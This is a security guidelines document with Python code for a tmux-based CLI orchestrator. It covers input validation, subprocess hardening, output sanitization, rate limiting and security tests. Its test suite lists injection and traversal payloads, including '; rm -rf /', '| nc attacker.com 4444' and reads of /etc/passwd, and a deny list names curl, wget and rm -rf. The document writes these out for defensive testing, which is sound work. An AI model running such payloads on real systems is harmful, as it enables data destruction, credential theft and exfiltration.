# CLI Security and Best Practices Guidelines

## Overview
This document establishes comprehensive security guidelines and best practices for CLI enhancements in the Tmux Orchestrator project. These guidelines are essential for maintaining a secure, robust, and trustworthy system that can safely execute commands and manage tmux sessions.

## Security Threat Model

### 1. Attack Vectors
The CLI system faces several potential attack vectors:
- **Command Injection**: Malicious input executed as shell commands
- **Path Traversal**: Unauthorized file system access via crafted paths
- **Information Disclosure**: Sensitive data leaked through outputs or logs
- **Resource Exhaustion**: DoS attacks through resource-intensive operations
- **Session Hijacking**: Unauthorized access to tmux sessions
- **MCP Protocol Abuse**: Malicious use of exposed MCP tools

### 2. Trust Boundaries
```
Human User
    ↓ (trusted input)
Claude Code CLI
    ↓ (validated input)
Business Logic Layer
    ↓ (sanitized commands)
TMUXManager
    ↓ (safe subprocess calls)
Operating System
```

## Input Validation Security

### 1. Target Format Validation
```python
import re
from typing import Tuple

class TargetValidator:
    """Secure target format validation."""

    # Session names: alphanumeric, hyphens, underscores, dots (1-50 chars)
    SESSION_PATTERN = re.compile(r'^[a-zA-Z0-9._-]{1,50}$')

    # Window numbers: 0-999
    WINDOW_PATTERN = re.compile(r'^[0-9]{1,3}$')

    @classmethod
    def validate_target(cls, target: str) -> Tuple[str, str]:
        """
        Validate and parse session:window target format.

        Args:
            target: Target in format "session:window"

        Returns:
            Tuple of (session, window)

        Raises:
            ValidationError: If target format is invalid or unsafe
        """
        if not target or len(target) > 100:
            raise ValidationError("Target too long or empty")

        # Check for null bytes
        if '\0' in target:
            raise ValidationError("Null bytes not allowed")

        # Parse target format
        parts = target.split(':')
        if len(parts) != 2:
            raise ValidationError("Target must be in format session:window")

        session, window = parts

        # Validate session name
        if not cls.SESSION_PATTERN.match(session):
            raise ValidationError(
                "Session name must be alphanumeric with hyphens, underscores, "
                "or dots (1-50 characters)"
            )

        # Validate window number
        if not cls.WINDOW_PATTERN.match(window):
            raise ValidationError("Window must be a number 0-999")

        window_num = int(window)
        if window_num > 999:
            raise ValidationError("Window number too large")

        return session, window
```

### 2. Agent Name Validation
```python
class AgentNameValidator:
    """Secure agent name validation."""

    # Agent names: alphanumeric, hyphens (3-30 chars)
    AGENT_NAME_PATTERN = re.compile(r'^[a-zA-Z0-9-]{3,30}$')

    # Reserved names that cannot be used
    RESERVED_NAMES = {
        'admin', 'root', 'system', 'daemon', 'orchestrator',
        'tmux', 'bash', 'sh', 'sudo', 'su'
    }

    @classmethod
    def validate_agent_name(cls, name: str) -> str:
        """
        Validate agent name for security and conventions.

        Args:
            name: Proposed agent name

        Returns:
            Validated agent name

        Raises:
            ValidationError: If name is invalid or unsafe
        """
        if not name:
            raise ValidationError("Agent name cannot be empty")

        # Length check
        if len(name) > 30:
            raise ValidationError("Agent name too long (max 30 characters)")

        # Pattern check
        if not cls.AGENT_NAME_PATTERN.match(name):
            raise ValidationError(
                "Agent name must be alphanumeric with hyphens (3-30 characters)"
            )

        # Reserved name check
        if name.lower() in cls.RESERVED_NAMES:
            raise ValidationError(f"'{name}' is a reserved name")

        # No consecutive hyphens
        if '--' in name:
            raise ValidationError("Consecutive hyphens not allowed")

        # Cannot start or end with hyphen
        if name.startswith('-') or name.endswith('-'):
            raise ValidationError("Name cannot start or end with hyphen")

        return name
```

### 3. Path Validation
```python
import os
from pathlib import Path

class PathValidator:
    """Secure path validation and sanitization."""

    @classmethod
    def validate_working_directory(cls, path: str) -> Path:
        """
        Validate working directory path for security.

        Args:
            path: Directory path to validate

        Returns:
            Validated Path object

        Raises:
            ValidationError: If path is unsafe
        """
        if not path:
            raise ValidationError("Path cannot be empty")

        # Convert to Path object
        try:
            path_obj = Path(path).resolve()
        except (OSError, ValueError) as e:
            raise ValidationError(f"Invalid path: {e}")

        # Check for null bytes
        if '\0' in str(path_obj):
            raise ValidationError("Null bytes in path")

        # Must be absolute after resolution
        if not path_obj.is_absolute():
            raise ValidationError("Path must be absolute")

        # Directory traversal protection
        path_str = str(path_obj)
        if '..' in path_str.split(os.sep):
            raise ValidationError("Path traversal detected")

        # Must exist and be a directory
        if not path_obj.exists():
            raise ValidationError("Path does not exist")

        if not path_obj.is_dir():
            raise ValidationError("Path is not a directory")

        # Check permissions
        if not os.access(path_obj, os.R_OK | os.W_OK):
            raise ValidationError("Insufficient permissions for directory")

        return path_obj
```

## Command Execution Security

### 1. Secure Subprocess Execution
```python
import subprocess
import shlex
from typing import List, Optional

class SecureCommandExecutor:
    """Secure command execution with comprehensive protection."""

    DEFAULT_TIMEOUT = 30  # seconds
    MAX_OUTPUT_SIZE = 1024 * 1024  # 1MB

    @classmethod
    def execute_command(
        cls,
        command: List[str],
        timeout: Optional[int] = None,
        cwd: Optional[Path] = None,
        capture_output: bool = True
    ) -> subprocess.CompletedProcess:
        """
        Execute command with security protections.

        Args:
            command: Command and arguments as list (never string)
            timeout: Command timeout in seconds
            cwd: Working directory (must be validated)
            capture_output: Whether to capture stdout/stderr

        Returns:
            CompletedProcess result

        Raises:
            SecurityError: If command is unsafe
            TimeoutError: If command times out
            CommandError: If command execution fails
        """
        # Validate command
        cls._validate_command(command)

        # Set timeout
        if timeout is None:
            timeout = cls.DEFAULT_TIMEOUT
        elif timeout > 300:  # 5 minutes max
            raise SecurityError("Timeout too long")

        # Validate working directory
        if cwd:
            cwd = PathValidator.validate_working_directory(str(cwd))

        try:
            # Execute with security restrictions
            result = subprocess.run(
                command,
                capture_output=capture_output,
                text=True,
                timeout=timeout,
                cwd=cwd,
                check=False,  # Don't raise on non-zero exit
                shell=False,  # NEVER use shell=True
                env=cls._get_safe_environment()
            )

            # Check output size
            if capture_output:
                cls._validate_output_size(result.stdout)
                cls._validate_output_size(result.stderr)

            return result

        except subprocess.TimeoutExpired:
            raise TimeoutError(f"Command timed out after {timeout}s")
        except OSError as e:
            raise CommandError(f"Command execution failed: {e}")

    @classmethod
    def _validate_command(cls, command: List[str]) -> None:
        """Validate command for security issues."""
        if not command:
            raise SecurityError("Empty command")

        if not isinstance(command, list):
            raise SecurityError("Command must be a list, not string")

        # Check each argument
        for arg in command:
            if not isinstance(arg, str):
                raise SecurityError("All command arguments must be strings")

            if '\0' in arg:
                raise SecurityError("Null bytes in command arguments")

            if len(arg) > 1000:
                raise SecurityError("Command argument too long")

        # Validate executable
        executable = command[0]
        if '/' in executable and not os.path.isabs(executable):
            raise SecurityError("Relative paths in executable")

        # Whitelist allowed executables
        allowed_executables = {'tmux', 'ps', 'pgrep', 'kill'}
        if os.path.basename(executable) not in allowed_executables:
            raise SecurityError(f"Executable '{executable}' not allowed")

    @classmethod
    def _get_safe_environment(cls) -> dict:
        """Get sanitized environment variables."""
        safe_env = {
            'PATH': '/usr/local/bin:/usr/bin:/bin',
            'LANG': 'C.UTF-8',
            'LC_ALL': 'C.UTF-8'
        }

        # Copy only safe variables from current environment
        safe_vars = {'HOME', 'USER', 'TMUX', 'TERM'}
        for var in safe_vars:
            if var in os.environ:
                safe_env[var] = os.environ[var]

        return safe_env

    @classmethod
    def _validate_output_size(cls, output: str) -> None:
        """Validate output size to prevent memory exhaustion."""
        if output and len(output.encode('utf-8')) > cls.MAX_OUTPUT_SIZE:
            raise SecurityError("Command output too large")
```

### 2. TMUX Command Security
```python
class SecureTMUXManager:
    """Secure TMUX operations with comprehensive validation."""

    def __init__(self):
        self.executor = SecureCommandExecutor()

    def list_sessions(self) -> List[dict]:
        """List tmux sessions securely."""
        try:
            result = self.executor.execute_command([
                'tmux', 'list-sessions', '-F',
                '#{session_name}:#{session_windows}:#{session_created}'
            ])

            if result.returncode != 0:
                # No sessions is normal, not an error
                if 'no server running' in result.stderr:
                    return []
                raise TMUXError(f"Failed to list sessions: {result.stderr}")

            return self._parse_session_output(result.stdout)

        except TimeoutError:
            raise TMUXError("Session listing timed out")

    def send_keys(self, target: str, keys: str) -> None:
        """Send keys to tmux session with validation."""
        # Validate target
        session, window = TargetValidator.validate_target(target)

        # Validate keys
        self._validate_keys(keys)

        # Execute command
        result = self.executor.execute_command([
            'tmux', 'send-keys', '-t', f'{session}:{window}', keys, 'Enter'
        ])

        if result.returncode != 0:
            raise TMUXError(f"Failed to send keys: {result.stderr}")

    def _validate_keys(self, keys: str) -> None:
        """Validate keys to send for security."""
        if not keys:
            raise ValidationError("Keys cannot be empty")

        if len(keys) > 10000:
            raise ValidationError("Keys too long")

        # Check for dangerous patterns
        dangerous_patterns = [
            'sudo ', 'su ', 'rm -rf', '> /dev/', 'curl ', 'wget ',
            'chmod +x', 'eval ', 'exec ', '$(', '`'
        ]

        keys_lower = keys.lower()
        for pattern in dangerous_patterns:
            if pattern in keys_lower:
                raise SecurityError(f"Dangerous pattern detected: {pattern}")
```

## Output Security and Sanitization

### 1. Information Disclosure Prevention
```python
import re
from typing import Any, Dict

class OutputSanitizer:
    """Sanitize outputs to prevent information disclosure."""

    # Patterns for sensitive information
    SENSITIVE_PATTERNS = [
        # API keys and tokens
        (re.compile(r'sk-[a-zA-Z0-9]{20,}'), 'sk-***'),
        (re.compile(r'ghp_[a-zA-Z0-9]{36}'), 'ghp_***'),
        (re.compile(r'gho_[a-zA-Z0-9]{36}'), 'gho_***'),

        # Passwords and secrets
        (re.compile(r'password["\s]*[:=]["\s]*[^\s"]+', re.IGNORECASE), 'password=***'),
        (re.compile(r'secret["\s]*[:=]["\s]*[^\s"]+', re.IGNORECASE), 'secret=***'),

        # File paths
        (re.compile(r'/home/[^/\s]+'), '/home/USER'),
        (re.compile(r'/Users/[^/\s]+'), '/Users/USER'),

        # IP addresses (private ranges only)
        (re.compile(r'192\.168\.\d+\.\d+'), '192.168.X.X'),
        (re.compile(r'10\.\d+\.\d+\.\d+'), '10.X.X.X'),
        (re.compile(r'172\.1[6-9]\.\d+\.\d+'), '172.16.X.X'),
        (re.compile(r'172\.2[0-9]\.\d+\.\d+'), '172.20.X.X'),
        (re.compile(r'172\.3[0-1]\.\d+\.\d+'), '172.30.X.X'),
    ]

    @classmethod
    def sanitize_text(cls, text: str) -> str:
        """Sanitize text output for safe display."""
        if not text:
            return text

        sanitized = text

        # Apply all sensitive patterns
        for pattern, replacement in cls.SENSITIVE_PATTERNS:
            sanitized = pattern.sub(replacement, sanitized)

        return sanitized

    @classmethod
    def sanitize_json_response(cls, data: Dict[str, Any]) -> Dict[str, Any]:
        """Sanitize JSON response data."""
        if not isinstance(data, dict):
            return data

        sanitized = {}
        for key, value in data.items():
            if isinstance(value, str):
                sanitized[key] = cls.sanitize_text(value)
            elif isinstance(value, dict):
                sanitized[key] = cls.sanitize_json_response(value)
            elif isinstance(value, list):
                sanitized[key] = [
                    cls.sanitize_text(item) if isinstance(item, str)
                    else cls.sanitize_json_response(item) if isinstance(item, dict)
                    else item
                    for item in value
                ]
            else:
                sanitized[key] = value

        return sanitized
```

### 2. Error Message Security
```python
class SecureErrorHandler:
    """Handle errors without information disclosure."""

    @classmethod
    def create_safe_error_response(
        cls,
        error: Exception,
        command: str,
        include_details: bool = False
    ) -> Dict[str, Any]:
        """Create sanitized error response."""

        # Determine error type and safe message
        if isinstance(error, ValidationError):
            error_type = "ValidationError"
            safe_message = str(error)  # Validation errors are safe to show
        elif isinstance(error, SecurityError):
            error_type = "SecurityError"
            safe_message = "Security validation failed"  # Don't reveal details
        elif isinstance(error, TMUXError):
            error_type = "TMUXError"
            safe_message = "TMUX operation failed"
            if include_details and not cls._contains_sensitive_info(str(error)):
                safe_message = str(error)
        else:
            error_type = "InternalError"
            safe_message = "An internal error occurred"

        response = {
            "success": False,
            "error": safe_message,
            "error_type": error_type,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "command": command
        }

        return OutputSanitizer.sanitize_json_response(response)

    @classmethod
    def _contains_sensitive_info(cls, message: str) -> bool:
        """Check if error message contains sensitive information."""
        for pattern, _ in OutputSanitizer.SENSITIVE_PATTERNS:
            if pattern.search(message):
                return True
        return False
```

## Resource Protection

### 1. Rate Limiting
```python
import time
from collections import defaultdict
from threading import Lock

class RateLimiter:
    """Rate limiting for command execution."""

    def __init__(self):
        self.requests = defaultdict(list)
        self.lock = Lock()

    def check_rate_limit(self, identifier: str, max_requests: int = 10, window: int = 60) -> bool:
        """
        Check if request is within rate limit.

        Args:
            identifier: Unique identifier (e.g., command type)
            max_requests: Maximum requests allowed
            window: Time window in seconds

        Returns:
            True if request is allowed, False otherwise
        """
        now = time.time()

        with self.lock:
            # Clean old requests
            self.requests[identifier] = [
                req_time for req_time in self.requests[identifier]
                if now - req_time < window
            ]

            # Check limit
            if len(self.requests[identifier]) >= max_requests:
                return False

            # Add current request
            self.requests[identifier].append(now)
            return True
```

### 2. Resource Monitoring
```python
import psutil
import resource

class ResourceMonitor:
    """Monitor and enforce resource limits."""

    MAX_MEMORY_MB = 500
    MAX_CPU_PERCENT = 50
    MAX_OPEN_FILES = 100

    @classmethod
    def check_resource_limits(cls) -> None:
        """Check current resource usage against limits."""
        # Memory check
        process = psutil.Process()
        memory_mb = process.memory_info().rss / 1024 / 1024

        if memory_mb > cls.MAX_MEMORY_MB:
            raise ResourceError(f"Memory usage too high: {memory_mb:.1f}MB")

        # CPU check (average over last second)
        cpu_percent = process.cpu_percent(interval=1)
        if cpu_percent > cls.MAX_CPU_PERCENT:
            raise ResourceError(f"CPU usage too high: {cpu_percent:.1f}%")

        # File descriptor check
        open_files = len(process.open_files())
        if open_files > cls.MAX_OPEN_FILES:
            raise ResourceError(f"Too many open files: {open_files}")

    @classmethod
    def set_resource_limits(cls) -> None:
        """Set process resource limits."""
        # Set memory limit (soft limit only)
        try:
            resource.setrlimit(
                resource.RLIMIT_AS,
                (cls.MAX_MEMORY_MB * 1024 * 1024, resource.RLIM_INFINITY)
            )
        except (OSError, ValueError):
            pass  # Some systems don't support this

        # Set file descriptor limit
        try:
            resource.setrlimit(
                resource.RLIMIT_NOFILE,
                (cls.MAX_OPEN_FILES, cls.MAX_OPEN_FILES * 2)
            )
        except (OSError, ValueError):
            pass
```

## MCP Security Considerations

### 1. MCP Tool Exposure
```python
class MCPSecurityManager:
    """Manage security for MCP tool exposure."""

    # Commands that should NOT be exposed as MCP tools
    RESTRICTED_COMMANDS = {
        'daemon',      # Daemon management is internal only
        'debug',       # Debug commands may expose sensitive info
        'raw-execute', # Direct execution without validation
    }

    # Commands that require additional validation
    SENSITIVE_COMMANDS = {
        'spawn',       # Agent spawning
        'kill',        # Agent termination
        'execute',     # PRD execution
    }

    @classmethod
    def validate_mcp_tool_exposure(cls, command_name: str) -> bool:
        """Check if command should be exposed as MCP tool."""
        if command_name in cls.RESTRICTED_COMMANDS:
            return False

        # Additional checks for sensitive commands
        if command_name in cls.SENSITIVE_COMMANDS:
            # Could implement additional validation here
            pass

        return True

    @classmethod
    def sanitize_mcp_tool_description(cls, description: str) -> str:
        """Sanitize MCP tool descriptions."""
        # Remove internal implementation details
        sanitized = re.sub(r'internal[^.]*\.', '', description, flags=re.IGNORECASE)

        # Remove debugging information
        sanitized = re.sub(r'debug[^.]*\.', '', sanitized, flags=re.IGNORECASE)

        return sanitized.strip()
```

## Audit and Logging

### 1. Security Event Logging
```python
import logging
from datetime import datetime
from typing import Optional

class SecurityLogger:
    """Secure logging for security events."""

    def __init__(self):
        self.logger = logging.getLogger('tmux_orchestrator.security')
        self.logger.setLevel(logging.INFO)

        # Configure secure file handler
        handler = logging.FileHandler('/tmp/tmux-orc-security.log')
        formatter = logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s'
        )
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)

    def log_security_event(
        self,
        event_type: str,
        message: str,
        command: Optional[str] = None,
        target: Optional[str] = None,
        severity: str = 'INFO'
    ) -> None:
        """Log security events with sanitization."""

        # Sanitize inputs
        safe_message = OutputSanitizer.sanitize_text(message)
        safe_command = OutputSanitizer.sanitize_text(command or '')
        safe_target = OutputSanitizer.sanitize_text(target or '')

        # Create log entry
        log_data = {
            'event_type': event_type,
            'message': safe_message,
            'command': safe_command,
            'target': safe_target,
            'timestamp': datetime.utcnow().isoformat(),
        }

        log_message = ' | '.join(f'{k}={v}' for k, v in log_data.items() if v)

        # Log based on severity
        if severity == 'ERROR':
            self.logger.error(log_message)
        elif severity == 'WARNING':
            self.logger.warning(log_message)
        else:
            self.logger.info(log_message)

    def log_command_execution(
        self,
        command: str,
        target: Optional[str] = None,
        success: bool = True,
        execution_time: Optional[float] = None
    ) -> None:
        """Log command execution events."""
        self.log_security_event(
            event_type='command_execution',
            message=f'Command {"succeeded" if success else "failed"}',
            command=command,
            target=target,
            severity='INFO' if success else 'WARNING'
        )
```

## Security Testing Requirements

### 1. Security Test Categories
```python
class SecurityTestSuite:
    """Comprehensive security testing for CLI commands."""

    def test_injection_attacks(self):
        """Test for various injection attacks."""
        injection_payloads = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '$(whoami)',
            '`id`',
            '| nc attacker.com 4444',
            '\0malicious',
            '../../../etc/passwd',
        ]

        for payload in injection_payloads:
            with pytest.raises((ValidationError, SecurityError)):
                # Test each CLI command with injection payload
                pass

    def test_path_traversal(self):
        """Test for path traversal vulnerabilities."""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'file:///etc/passwd',
        ]

        for payload in traversal_payloads:
            with pytest.raises((ValidationError, SecurityError)):
                # Test path-related commands
                pass

    def test_resource_exhaustion(self):
        """Test for resource exhaustion attacks."""
        # Test with very long inputs
        long_input = 'A' * 100000

        with pytest.raises((ValidationError, ResourceError)):
            # Test commands with oversized input
            pass

        # Test rapid-fire requests
        for _ in range(100):
            # Should hit rate limits
            pass
```

## Implementation Checklist

### Security Implementation Checklist
- [ ] Input validation implemented for all user inputs
- [ ] Command injection protection in place
- [ ] Path traversal protection implemented
- [ ] Output sanitization configured
- [ ] Error message sanitization active
- [ ] Resource limits enforced
- [ ] Rate limiting implemented
- [ ] Security event logging configured
- [ ] MCP tool exposure restrictions applied
- [ ] Security tests written and passing

### Code Review Security Checklist
- [ ] No shell=True in subprocess calls
- [ ] All user inputs validated and sanitized
- [ ] No hardcoded secrets or credentials
- [ ] Proper error handling without information disclosure
- [ ] Resource limits and timeouts configured
- [ ] Audit logging implemented
- [ ] Security test coverage adequate
- [ ] Documentation includes security considerations

This security framework provides comprehensive protection while maintaining the usability and functionality of the CLI system. Regular security reviews and updates should be conducted to address new threats and vulnerabilities.
